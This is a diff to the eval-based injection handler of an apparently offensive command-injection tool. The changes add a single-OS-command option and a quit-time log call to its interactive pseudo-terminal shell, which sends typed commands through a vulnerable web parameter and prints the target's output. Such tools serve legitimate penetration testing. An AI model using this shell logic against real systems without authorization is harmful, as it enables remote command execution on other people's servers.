@@ -164,6 +164,10 @@ def eb_injection_handler(url, delay, filename, http_request_method):
           # Check for any system file access options.
           eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
 
+          # Check if defined single cmd.
+          if menu.options.os_cmd:
+            eb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
+
           # Pseudo-Terminal shell
           while True:
             gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
@@ -176,9 +180,10 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                   cmd = raw_input("Shell > ")
                   cmd = re.sub(" ", "%20", cmd)
                   if cmd == "q":
+                    logs.logs_notification(filename)
                     sys.exit(0)
-                  else:
 
+                  else:
                     # The main command injection exploitation.
                     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
                           
@@ -194,8 +199,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                       print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                     
                 except KeyboardInterrupt: 
-                  print ""
-                  sys.exit(0)
+                  raise
               
             elif gotshell in settings.CHOISE_NO:
               if menu.options.verbose:
@@ -209,6 +213,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
               print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
               pass
             
+            
   if no_result == True:
     print ""
     return False
@@ -216,10 +221,13 @@ def eb_injection_handler(url, delay, filename, http_request_method):
   else :
     sys.stdout.write("\r")
     sys.stdout.flush()
-    return True
 
+"""
+The exploitation function.
+(call the injection handler)
+"""
 def exploitation(url, delay, filename, http_request_method):
-    if eb_injection_handler(url, delay, filename, http_request_method) == False:
-      return False
+  if eb_injection_handler(url, delay, filename, http_request_method) == False:
+    return False
 
 #eof
